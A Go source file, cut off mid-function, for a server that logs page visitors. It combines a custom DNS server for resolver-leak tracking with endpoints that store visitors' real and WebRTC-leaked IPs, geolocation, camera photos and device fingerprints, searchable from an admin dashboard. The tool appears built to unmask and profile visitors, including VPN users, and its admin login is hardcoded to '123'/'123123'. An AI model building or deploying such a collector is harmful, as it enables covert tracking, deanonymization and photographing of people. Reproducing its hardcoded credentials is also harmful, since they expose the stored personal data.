package main

import (
	"context"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"embed"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

//go:embed web/*
var webFS embed.FS

// ---------------------------------------------------------------------------
// configuration
// ---------------------------------------------------------------------------

type config struct {
	HTTPAddr    string
	DNSAddr     string
	DNSZone     string // authoritative zone, e.g. "dnsprobe.local"
	DataDir     string
	PublicURL   string // external base URL clients use for the beacon host
	ServerIP    net.IP // IP the DNS server returns for A queries
	TLSMode     string // "", "selfsigned", or "cert"
	TLSCertFile string
	TLSKeyFile  string
	TLSHosts    []string // extra SANs for the self-signed cert
}

func loadConfig() config {
	c := config{
		HTTPAddr:    envOr("HTTP_ADDR", ":8080"),
		DNSAddr:     envOr("DNS_ADDR", ":53"),
		DNSZone:     strings.TrimSuffix(envOr("DNS_ZONE", "dnsprobe.local"), "."),
		DataDir:     envOr("DATA_DIR", "data"),
		PublicURL:   envOr("PUBLIC_URL", ""),
		TLSMode:     envOr("TLS", ""),
		TLSCertFile: envOr("TLS_CERT", ""),
		TLSKeyFile:  envOr("TLS_KEY", ""),
	}
	if ip := envOr("SERVER_IP", ""); ip != "" {
		c.ServerIP = net.ParseIP(ip)
	}
	if h := envOr("TLS_HOSTS", ""); h != "" {
		c.TLSHosts = strings.Split(h, ",")
	}
	return c
}

func boolEnv(k string) bool {
	v := strings.ToLower(os.Getenv(k))
	return v == "1" || v == "true" || v == "yes"
}

func envOr(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

// ---------------------------------------------------------------------------
// storage
// ---------------------------------------------------------------------------

type Record struct {
	ID             int64     `json:"id"`
	SessionID      string    `json:"session_id"`
	DNSToken       string    `json:"dns_token"`
	PublicIP       string    `json:"public_ip"`
	XForwardedFor  string    `json:"x_forwarded_for"`
	WebRTCIPs      []string  `json:"webrtc_ips"`
	ResolverIPs    []string  `json:"resolver_ips"`
	ExternalIPs    []string  `json:"external_ips"`
	Latitude       float64   `json:"latitude"`
	Longitude      float64   `json:"longitude"`
	LocationAcc    float64   `json:"location_accuracy"`
	LocationErr    string    `json:"location_error"`
	PhotoPath      string    `json:"photo_path"`
	HasPhoto       bool      `json:"has_photo"`
	UserAgent      string    `json:"user_agent"`
	Language       string    `json:"language"`
	Platform       string    `json:"platform"`
	Timezone       string    `json:"timezone"`
	Screen         string    `json:"screen"`
	CreatedAt      time.Time `json:"created_at"`
	UpdatedAt      time.Time `json:"updated_at"`
}

type Store struct {
	mu      sync.RWMutex
	records map[string]*Record
	order   []string
	nextID  int64
	path    string
}

func NewStore(dir, path string) (*Store, error) {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, err
	}
	s := &Store{records: map[string]*Record{}, path: path}
	if b, err := os.ReadFile(path); err == nil {
		var list []*Record
		if err := json.Unmarshal(b, &list); err == nil {
			for _, r := range list {
				s.records[r.SessionID] = r
				s.order = append(s.order, r.SessionID)
				if r.ID >= s.nextID {
					s.nextID = r.ID + 1
				}
			}
		}
	}
	return s, nil
}

func (s *Store) persist() {
	out := make([]*Record, 0, len(s.order))
	seen := map[string]bool{}
	for _, sid := range s.order {
		if r, ok := s.records[sid]; ok && !seen[sid] {
			out = append(out, r)
			seen[sid] = true
		}
	}
	b, err := json.MarshalIndent(out, "", "  ")
	if err != nil {
		return
	}
	tmp := s.path + ".tmp"
	if err := os.WriteFile(tmp, b, 0o644); err == nil {
		_ = os.Rename(tmp, s.path)
	}
}

func (s *Store) Upsert(r Record) *Record {
	s.mu.Lock()
	defer s.mu.Unlock()
	now := time.Now()
	if len(r.WebRTCIPs) == 0 {
		r.WebRTCIPs = []string{}
	}
	if len(r.ResolverIPs) == 0 {
		r.ResolverIPs = []string{}
	}
	if len(r.ExternalIPs) == 0 {
		r.ExternalIPs = []string{}
	}
	rec, ok := s.records[r.SessionID]
	if !ok {
		r.ID = s.nextID
		s.nextID++
		r.CreatedAt = now
		r.UpdatedAt = now
		s.records[r.SessionID] = &r
		s.order = append(s.order, r.SessionID)
		s.persist()
		return s.records[r.SessionID]
	}
	rec.UpdatedAt = now
	if r.PublicIP != "" {
		rec.PublicIP = r.PublicIP
	}
	if r.XForwardedFor != "" {
		rec.XForwardedFor = r.XForwardedFor
	}
	if len(r.WebRTCIPs) > 0 {
		rec.WebRTCIPs = uniq(append(rec.WebRTCIPs, r.WebRTCIPs...))
	}
	if len(r.ResolverIPs) > 0 {
		rec.ResolverIPs = uniq(append(rec.ResolverIPs, r.ResolverIPs...))
	}
	if len(r.ExternalIPs) > 0 {
		rec.ExternalIPs = uniq(append(rec.ExternalIPs, r.ExternalIPs...))
	}
	if r.Latitude != 0 || r.Longitude != 0 {
		rec.Latitude = r.Latitude
		rec.Longitude = r.Longitude
		rec.LocationAcc = r.LocationAcc
	}
	if r.LocationErr != "" {
		rec.LocationErr = r.LocationErr
	}
	if r.PhotoPath != "" {
		rec.PhotoPath = r.PhotoPath
		rec.HasPhoto = true
	}
	if r.UserAgent != "" {
		rec.UserAgent = r.UserAgent
	}
	if r.Language != "" {
		rec.Language = r.Language
	}
	if r.Platform != "" {
		rec.Platform = r.Platform
	}
	if r.Timezone != "" {
		rec.Timezone = r.Timezone
	}
	if r.Screen != "" {
		rec.Screen = r.Screen
	}
	s.persist()
	return rec
}

func (s *Store) SetResolverIP(token, ip string) {
	if token == "" || ip == "" {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, sid := range s.order {
		r := s.records[sid]
		if r.DNSToken == token {
			r.ResolverIPs = uniq(append(r.ResolverIPs, ip))
			r.UpdatedAt = time.Now()
		}
	}
	s.persist()
}

func (s *Store) List(f Filter) ([]*Record, int) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	var out []*Record
	for i := len(s.order) - 1; i >= 0; i-- {
		r := s.records[s.order[i]]
		if f.From != nil && r.CreatedAt.Before(*f.From) {
			continue
		}
		if f.To != nil && r.CreatedAt.After(*f.To) {
			continue
		}
		if f.IP != "" && !ipMatches(r, f.IP) {
			continue
		}
		if f.Session != "" && r.SessionID != f.Session {
			continue
		}
		out = append(out, r)
	}
	total := len(out)
	if f.PerPage <= 0 {
		f.PerPage = 50
	}
	if f.Page <= 0 {
		f.Page = 1
	}
	start := (f.Page - 1) * f.PerPage
	if start > total {
		start = total
	}
	end := start + f.PerPage
	if end > total {
		end = total
	}
	return out[start:end], total
}

func (s *Store) Get(session string) (*Record, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	r, ok := s.records[session]
	return r, ok
}

func ipMatches(r *Record, q string) bool {
	q = strings.ToLower(q)
	if strings.Contains(strings.ToLower(r.PublicIP), q) {
		return true
	}
	for _, ip := range r.WebRTCIPs {
		if strings.Contains(strings.ToLower(ip), q) {
			return true
		}
	}
	for _, ip := range r.ResolverIPs {
		if strings.Contains(strings.ToLower(ip), q) {
			return true
		}
	}
	for _, ip := range r.ExternalIPs {
		if strings.Contains(strings.ToLower(ip), q) {
			return true
		}
	}
	if strings.Contains(strings.ToLower(r.SessionID), q) {
		return true
	}
	return false
}

func uniq(in []string) []string {
	seen := map[string]bool{}
	out := make([]string, 0, len(in))
	for _, v := range in {
		if v == "" || seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
	}
	return out
}

type Filter struct {
	From    *time.Time
	To      *time.Time
	IP      string
	Session string
	Page    int
	PerPage int
}

// ---------------------------------------------------------------------------
// DNS-leak server (minimal hand-written UDP DNS, stdlib only)
// ---------------------------------------------------------------------------

type DNSServer struct {
	addr     string
	zone     string
	serverIP net.IP
	onQuery  func(token, sourceIP string)
}

func newDNSServer(addr, zone string, serverIP net.IP, onQuery func(string, string)) *DNSServer {
	return &DNSServer{
		addr:     addr,
		zone:     strings.TrimSuffix(strings.ToLower(zone), "."),
		serverIP: serverIP.To4(),
		onQuery:  onQuery,
	}
}

func (d *DNSServer) Run(ctx context.Context) error {
	uaddr, err := net.ResolveUDPAddr("udp", d.addr)
	if err != nil {
		return err
	}
	conn, err := net.ListenUDP("udp", uaddr)
	if err != nil {
		return err
	}
	defer conn.Close()
	log.Printf("DNS-leak server listening on %s (zone=%s)", uaddr.String(), d.zone)
	go func() {
		<-ctx.Done()
		_ = conn.Close()
	}()
	buf := make([]byte, 1500)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			if errors.Is(err, net.ErrClosed) {
				return nil
			}
			log.Printf("dns read: %v", err)
			continue
		}
		q := make([]byte, n)
		copy(q, buf[:n])
		go d.handle(conn, q, raddr)
	}
}

// handle parses a single DNS query, logs the resolver source IP + token,
// and responds with an A record pointing at the server IP.
func (d *DNSServer) handle(conn *net.UDPConn, q []byte, raddr *net.UDPAddr) {
	if len(q) < 12 {
		return
	}
	id := q[0:2]
	flags := uint16(q[2])<<8 | uint16(q[3])
	qr := flags>>15&1 == 1
	if qr {
		return // not a query
	}
	qd := int(uint16(q[4])<<8 | uint16(q[5]))
	if qd < 1 {
		return
	}
	pos := 12
	name, npos, ok := readName(q, pos)
	if !ok {
		return
	}
	pos = npos
	if pos+4 > len(q) {
		return
	}
	qtype := int(uint16(q[pos])<<8 | uint16(q[pos+1]))
	qclass := int(uint16(q[pos+2])<<8 | uint16(q[pos+3]))
	pos += 4

	sourceIP := raddr.IP.String()
	token := firstLabel(name)
	// log the resolver that queried us (anti-spoof: may differ from HTTP IP)
	if d.onQuery != nil {
		d.onQuery(token, sourceIP)
	}

	// build response
	resp := []byte{}
	resp = append(resp, id...)                         // id
	var rflags uint16 = 0x8000 | 0x0400 | 0x0080       // QR=1, AA=1, RA=1
	rflags |= flags & 0x0100                           // copy RD
	resp = append(resp, byte(rflags>>8), byte(rflags)) // flags
	resp = append(resp, byte(qd>>8), byte(qd))         // qdcount
	ancount := uint16(0)
	if (qtype == 1 || qtype == 28) && (qclass == 1) { // A or AAAA, IN
		ancount = 1
	}
	resp = append(resp, byte(ancount>>8), byte(ancount)) // ancount
	resp = append(resp, 0, 0)                           // nscount
	resp = append(resp, 0, 0)                           // arcount
	// question section: copy name + type + class
	resp = append(resp, q[12:pos]...)
	// answer
	if ancount == 1 {
		// use name pointer to question name (offset 12)
		resp = append(resp, 0xc0, 0x0c)
		var rdata []byte
		var atype uint16
		if qtype == 1 {
			atype = 1
			if len(d.serverIP) == 4 {
				rdata = d.serverIP
			}
		} else {
			atype = 28
		}
		resp = append(resp, byte(atype>>8), byte(atype))        // type
		resp = append(resp, 0, 1)                               // class IN
		resp = append(resp, 0, 0, 0, 60)                        // TTL 60
		resp = append(resp, byte(len(rdata)>>8), byte(len(rdata))) // rdlength
		resp = append(resp, rdata...)
	}
	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, _ = conn.WriteToUDP(resp, raddr)
}

// readName reads a DNS name (no compression pointers handling for queries,
// but supports compression just in case) and returns (name, endPos, ok).
func readName(msg []byte, pos int) (string, int, bool) {
	var labels []string
	jumped := false
	safe := 0
	origPos := pos
	for {
		if pos >= len(msg) || safe > 256 {
			return "", pos, false
		}
		l := int(msg[pos])
		if l == 0 {
			pos++
			break
		}
		if l&0xc0 == 0xc0 {
			if pos+1 >= len(msg) {
				return "", pos, false
			}
			ptr := int(uint16(l&0x3f)<<8 | uint16(msg[pos+1]))
			if !jumped {
				origPos = pos + 2
				jumped = true
			}
			pos = ptr
			continue
		}
		if pos+1+l > len(msg) {
			return "", pos, false
		}
		labels = append(labels, string(msg[pos+1:pos+1+l]))
		pos += 1 + l
		safe += 1 + l
	}
	if jumped {
		pos = origPos
	}
	return strings.ToLower(strings.Join(labels, ".")), pos, true
}

func firstLabel(name string) string {
	if i := strings.IndexByte(name, '.'); i > 0 {
		return name[:i]
	}
	return name
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func randToken(n int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	var rb [1]byte
	for i := range b {
		if _, err := cryptorand.Read(rb[:]); err != nil {
			// extremely unlikely fallback; never panics
			b[i] = charset[0]
			continue
		}
		b[i] = charset[int(rb[0])%len(charset)]
	}
	return string(b)
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return strings.TrimSpace(xri)
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func parseTime(s string) time.Time {
	if s == "" {
		return time.Time{}
	}
	layouts := []string{time.RFC3339, "2006-01-02T15:04", "2006-01-02 15:04", "2006-01-02"}
	for _, l := range layouts {
		if t, err := time.ParseInLocation(l, s, time.Local); err == nil {
			return t
		}
	}
	return time.Time{}
}

// ---------------------------------------------------------------------------
// HTTP app
// ---------------------------------------------------------------------------

type App struct {
	cfg         config
	store       *Store
	dns         *DNSServer
	mux         *http.ServeMux
	dnsSeen     map[string][]string
	dnsSeenLock sync.RWMutex
	sessions    map[string]time.Time // token -> expiry
	sessLock    sync.RWMutex
}

func (a *App) routes() {
	a.mux.HandleFunc("/", a.handleIndex)
	a.mux.HandleFunc("/admin/login", a.handleAdminLogin)
	a.mux.HandleFunc("/admin/logout", a.handleAdminLogout)
	a.mux.HandleFunc("/admin", a.requireAuth(a.handleAdmin))
	a.mux.HandleFunc("/admin/", a.requireAuth(a.handleAdmin))
	a.mux.HandleFunc("/api/session", a.handleSession)
	a.mux.HandleFunc("/api/report", a.handleReport)
	a.mux.HandleFunc("/api/photo", a.handlePhoto)
	a.mux.HandleFunc("/api/dns-beacon", a.handleDNSBeacon)
	a.mux.HandleFunc("/api/echo", a.handleEcho)
	a.mux.HandleFunc("/api/admin/records", a.requireAuth(a.handleAdminList))
	a.mux.HandleFunc("/api/admin/records/", a.requireAuth(a.handleAdminDetail))
}

func (a *App) handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	a.serveFile(w, r, "web/index.html", "text/html; charset=utf-8")
}

// requireAuth wraps a handler so only authenticated admins can access it.
// Unauthenticated HTML requests redirect to /admin/login; API requests get
// 401 JSON. Neither case blocks the program.
func (a *App) requireAuth(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		c, err := r.Cookie("admin_session")
		if err != nil || !a.validSession(c.Value) {
			if strings.HasPrefix(r.URL.Path, "/api/") {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusUnauthorized)
				_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "未登录"})
				return
			}
			http.Redirect(w, r, "/admin/login", http.StatusSeeOther)
			return
		}
		h(w, r)
	}
}

func (a *App) validSession(token string) bool {
	if token == "" {
		return false
	}
	a.sessLock.RLock()
	defer a.sessLock.RUnlock()
	exp, ok := a.sessions[token]
	if !ok {
		return false
	}
	if time.Now().After(exp) {
		return false
	}
	return true
}

func (a *App) createSession() string {
	token := randToken(32)
	a.sessLock.Lock()
	if a.sessions == nil {
		a.sessions = map[string]time.Time{}
	}
	a.sessions[token] = time.Now().Add(24 * time.Hour)
	a.sessLock.Unlock()
	return token
}

func (a *App) deleteSession(token string) {
	a.sessLock.Lock()
	delete(a.sessions, token)
	a.sessLock.Unlock()
}

// handleAdminLogin serves the login page (GET) or verifies credentials (POST).
// Username "123", password "123123". Constant-time compare to avoid timing leaks.
func (a *App) handleAdminLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		a.serveFile(w, r, "web/admin_login.html", "text/html; charset=utf-8")
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	_ = r.ParseForm()
	u, p := r.FormValue("username"), r.FormValue("password")
	if subtle.ConstantTimeCompare([]byte(u), []byte("123")) != 1 ||
		subtle.ConstantTimeCompare([]byte(p), []byte("123123")) != 1 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "用户名或密码错误"})
		return
	}
	token := a.createSession()
	http.SetCookie(w, &http.Cookie{
		Name: "admin_session", Value: token, Path: "/",
		HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: 86400,
	})
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "redirect": "/admin"})
}

func (a *App) handleAdminLogout(w http.ResponseWriter, r *http.Request) {
	if c, err := r.Cookie("admin_session"); err == nil {
		a.deleteSession(c.Value)
	}
	http.SetCookie(w, &http.Cookie{
		Name: "admin_session", Value: "", Path: "/",
		HttpOnly: true, SameSite: http.SameSiteLaxMode, MaxAge: -1,
	})
	http.Redirect(w, r, "/admin/login", http.StatusSeeOther)
}

func (a *App) handleAdmin(w http.ResponseWriter, r *http.Request) {
	a.serveFile(w, r, "web/admin.html", "text/html; charset=utf-8")
}

func (a *App) serveFile(w http.ResponseWriter, r *http.Request, name, ctype string) {
	b, err := webFS.ReadFile(name)
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", ctype)
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(b)
}

// /api/session returns a fresh session id + dns token + config the page needs.
func (a *App) handleSession(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	resp := map[string]any{
		"session_id":  randToken(16),
		"dns_token":   randToken(16),
		"dns_zone":    a.cfg.DNSZone,
		"public_url":  a.cfg.PublicURL,
		"server_time": time.Now().Format(time.RFC3339),
		"your_ip":     clientIP(r),
		"services": []string{
			"https://api.ipify.org?format=json",
			"https://ipapi.co/json/",
			"https://ipwho.is/",
		},
	}
	_ = json.NewEncoder(w).Encode(resp)
}

// /api/report accepts a partial report; merges into the store. Never blocks.
func (a *App) handleReport(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 4<<20))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}
	var in Record
	if err := json.Unmarshal(body, &in); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	if in.SessionID == "" {
		http.Error(w, "missing session_id", http.StatusBadRequest)
		return
	}
	// server-authoritative fields (the client cannot fake these)
	in.PublicIP = clientIP(r)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		in.XForwardedFor = strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if in.UserAgent == "" {
		in.UserAgent = r.UserAgent()
	}
	// attach any DNS resolver IP already seen for this token
	if in.DNSToken != "" {
		a.dnsSeenLock.RLock()
		ips, ok := a.dnsSeen[in.DNSToken]
		a.dnsSeenLock.RUnlock()
		if ok && len(ips) > 0 {
			in.ResolverIPs = append(in.ResolverIPs, ips...)
		}
	}
	rec := a.store.Upsert(in)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"ok":         true,
		"session_id": rec.SessionID,
		"public_ip":  rec.PublicIP,
	})
}

// /api/photo accepts a base64/jpeg photo for a session.
func (a *App) handlePhoto(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var payload struct {
		SessionID string `json:"session_id"`
		Photo     string `json:"photo"` // data URL or raw base64
	}
	body, err := io.ReadAll(http.MaxBytesReader(w, r.Body, 8<<20))
	if err != nil {
		http.Error(w, "body too large", http.StatusRequestEntityTooLarge)
		return
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	if payload.SessionID == "" || payload.Photo == "" {
		http.Error(w, "missing fields", http.StatusBadRequest)
		return
	}
	data := payload.Photo
	if i := strings.Index(data, ","); i >= 0 && strings.HasPrefix(data, "data:") {
		data = data[i+1:]
	}
	dec := make([]byte, len(data))
	n, err := base64Decode(data, dec)
	if err != nil || n == 0 {
		http.Error(w, "bad photo data", http.StatusBadRequest)
		return
	}
	photoDir := filepath.Join(a.cfg.DataDir, "photos")
	_ = os.MkdirAll(photoDir, 0o755)
	fname := filepath.Join(photoDir, payload.SessionID+".jpg")
	if err := os.WriteFile(fname, dec[:n], 0o644); err != nil {
		http.Error(w, "save failed", http.StatusInternalServerError)
		return
	}
	a.store.Upsert(Record{SessionID: payload.SessionID, PhotoPath: fname, HasPhoto: true})
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{"ok": true})
}

// /api/dns-beacon is hit by the client via the token hostname; the source IP
// here is the DNS-resolved path (after the client's resolver returns our IP).
func (a *App) handleDNSBeacon(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != "" {
		ip := clientIP(r)
		a.store.SetResolverIP(token, ip)
	}
	// 1x1 transparent gif so an <img> trigger never errors visibly
	gif := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 1, 0, 1, 0, 0x80, 0, 0, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x4, 1, 0, 0, 0, 0, 0x2c, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0x02, 0x02, 0x44, 0x01, 0, 0x3b}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store")
	_, _ = w.Write(gif)
}

// /api/echo returns the server's view of the caller (for the client to compare
// its self-reported IPs against the server's view = anti-spoof signal).
func (a *App) handleEcho(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"ip":          clientIP(r),
		"user_agent":  r.UserAgent(),
		"x_forwarded": r.Header.Get("X-Forwarded-For"),
		"server_time": time.Now().Format(time.RFC3339),
	})
}

func (a *App) handleAdminList(w http.ResponseWriter, r *http.Request) {
	f := Filter{
		IP:      r.URL.Query().Get("ip"),
		Session: r.URL.Query().Get("session"),
		Page:    atoiOr(r.URL.Query().Get("page"), 1),
		PerPage: atoiOr(r.URL.Query().Get("per_page"), 50),
	}
	if v := r.URL.Query().Get("from"); v != "" {
		if t := parseTime(v); !t.IsZero() {
			f.From = &t
		}
	}
	if v := r.URL.Query().Get("to"); v != "" {
		if t := parseTime(v); !t.IsZero() {
			t = t.Add(24*time.Hour - time.Second)
			f.To = &t
		}
	}
	recs, total := a.store.List(f)
	// strip large photo path; keep a url instead
	type item struct {
		ID          int64     `json:"id"`
		SessionID   string    `json:"session_id"`
		PublicIP    string    `json:"public_ip"`
		WebRTCIPs   []string  `json:"webrtc_ips"`
		ResolverIPs []string  `json:"resolver_ips"`
		ExternalIPs []string  `json:"external_ips"`
		Lat         float64   `json:"latitude"`
		Lon         float64   `json:"longitude"`
		HasPhoto    bool      `json:"has_photo"`
		PhotoURL    string    `json:"photo_url"`
		UserAgent   string    `json:"user_agent"`
		CreatedAt   time.Time `json:"created_at"`
	}
	out := make([]item, 0, len(recs))
	for _, r := range recs {
		phURL := ""
		if r.HasPhoto {
			phURL = "/api/admin/records/" + r.SessionID + "/photo"
		}
		out = append(out, item{
			ID: r.ID, SessionID: r.SessionID, PublicIP: r.PublicIP,
			WebRTCIPs: r.WebRTCIPs, ResolverIPs: r.ResolverIPs, ExternalIPs: r.ExternalIPs,
			Lat: r.Latitude, Lon: r.Longitude, HasPhoto: r.HasPhoto, PhotoURL: phURL,
			UserAgent: r.UserAgent, CreatedAt: r.CreatedAt,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"records":  out,
		"total":    total,
		"page":     f.Page,
		"per_page": f.PerPage,
	})
}

func (a *App) handleAdminDetail(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/admin/records/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "missing id", http.StatusBadRequest)
		return
	}
	sid := parts[0]
	rec, ok := a.store.Get(sid)
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if len(parts) >= 2 && parts[1] == "photo" {
		if rec.PhotoPath == "" {
			http.NotFound(w, r)
			return
		}
		http.ServeFile(w, r, rec.PhotoPath)
		return
	}
	// full record (server view)
	full := map[string]any{
		"id":              rec.ID,
		"session_id":      rec.SessionID,
		"dns_token":       rec.DNSToken,
		"public_ip":       rec.PublicIP,
		"x_forwarded_for": rec.XForwardedFor,
		"webrtc_ips":      rec.WebRTCIPs,
		"resolver_ips":    rec.ResolverIPs,
		"external_ips":    rec.ExternalIPs,
		"latitude":        rec.Latitude,
		"longitude":       rec.Longitude,
		"location_acc":    rec.LocationAcc,
		"location_error":  rec.LocationErr,
		"has_photo":       rec.HasPhoto,
		"photo_url":       photoURL(rec),
		"user_agent":      rec.UserAgent,
		"language":        rec.Language,
		"platform":        rec.Platform,
		"timezone":        rec.Timezone,
		"screen":          rec.Screen,
		"created_at":      rec.CreatedAt,
		"updated_at":      rec.UpdatedAt,
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(full)
}

func photoURL(r *Record) string {
	if r.HasPhoto {
		return "/api/admin/records/" + r.SessionID + "/photo"
	}
	return ""
}

// dnsSeen caches resolver IPs observed by the DNS server, keyed by token,
// so a report that arrives before/after the DNS query can still attach them.
func (a *App) onDNSQuery(token, ip string) {
	if token == "" || ip == "" {
		return
	}
	a.dnsSeenLock.Lock()
	if a.dnsSeen == nil {
		a.dnsSeen = map[string][]string{}
	}
	a.dnsSeen[token] = uniq(append(a.dnsSeen[token], ip))
	a.dnsSeenLock.Unlock()
	a.store.SetResolverIP(token, ip)
}

func atoiOr(s string, def int) int {
	if n, err := strconv.Atoi(s); err == nil && n > 0 {
		return n
	}
	return def
}

// base64Decode decodes std or url base64 into dst; returns bytes written.
func base64Decode(s string, dst []byte) (int, error) {
	s = strings.TrimSpace(s)
	// pad to multiple of 4 for std encoding
	if i := len(s) % 4; i != 0 {
		s += strings.Repeat("=", 4-i)
	}
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		b, err = base64.URLEncoding.DecodeString(s)
		if err != nil {
			return 0, err
		}
	}
	if len(b) > len(dst) {
		b = b[:len(dst)]
	}
	copy(dst, b)
	return len(b), nil
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	cfg := loadConfig()
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.Printf("starting: http=%s dns=%s zone=%s data=%s publicURL=%q",
		cfg.HTTPAddr, cfg.DNSAddr, cfg.DNSZone, cfg.DataDir, cfg.PublicURL)

	store, err := NewStore(cfg.DataDir, filepath.Join(cfg.DataDir, "records.json"))
	if err != nil {
		log.Fatalf("store: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	app := &App{
		cfg:      cfg,
		store:    store,
		mux:      http.NewServeMux(),
		sessions: map[string]time.Time{},
	}
	app.dns = newDNSServer(cfg.DNSAddr, cfg.DNSZone, cfg.ServerIP, app.onDNSQuery)
	app.dnsSeen = map[string][]string{}
	app.routes()

	// DNS server is best-effort: if it can't bind (no privs / port busy),
	// the rest of the app keeps working.
	go func() {
		if err := app.dns.Run(ctx); err != nil {
			log.Printf("DNS server stopped: %v (HTTP still serving)", err)
		}
	}()

	srv := &http.Server{
		Addr:              cfg.HTTPAddr,
		Handler:           logMiddleware(app.mux),
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	// HTTPS is required for geolocation + camera (Secure Context). TLS is opt-in:
	//   TLS=selfsigned            -> generate an in-memory self-signed cert
	//   TLS=cert TLS_CERT=... TLS_KEY=... -> use provided cert/key files
	//   (unset)                   -> plain HTTP
	switch strings.ToLower(cfg.TLSMode) {
	case "selfsigned":
		tlsCfg, ferr := selfSignedTLSConfig(cfg)
		if ferr != nil {
			log.Fatalf("self-signed TLS: %v", ferr)
		}
		srv.TLSConfig = tlsCfg
		log.Printf("HTTPS server (self-signed) listening on %s", cfg.HTTPAddr)
		if err := srv.ListenAndServeTLS("", ""); err != nil && !errors.Is(err, http.ErrServerClosed) {
			log.Fatalf("https: %v", err)
		}
	case "cert":
		log.Printf("HTTPS server listening on %s (cert=%s)", cfg.HTTPAddr, cfg.TLSCertFile)
		if err := srv.ListenAndServeTLS(cfg.TLSCertFile, cfg.TLSKeyFile); err != nil && !errors.Is(err, http.ErrServerClosed) {
			log.Fatalf("https: %v", err)
		}
	default:
		log.Printf("HTTP server listening on %s", cfg.HTTPAddr)
		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			log.Fatalf("http: %v", err)
		}
	}
}

// selfSignedTLSConfig builds an in-memory, self-signed certificate whose SANs
// cover localhost, 127.0.0.1, ::1 and any extra hosts/IPs from cfg. This lets
// geolocation and camera work over https://<host>:port after the user accepts
// the untrusted-cert warning once. For public deployments, use a real cert.
func selfSignedTLSConfig(cfg config) (*tls.Config, error) {
	key, err := rsa.GenerateKey(cryptorand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	serial, _ := cryptorand.Int(cryptorand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := x509.Certificate{
		SerialNumber:          serial,
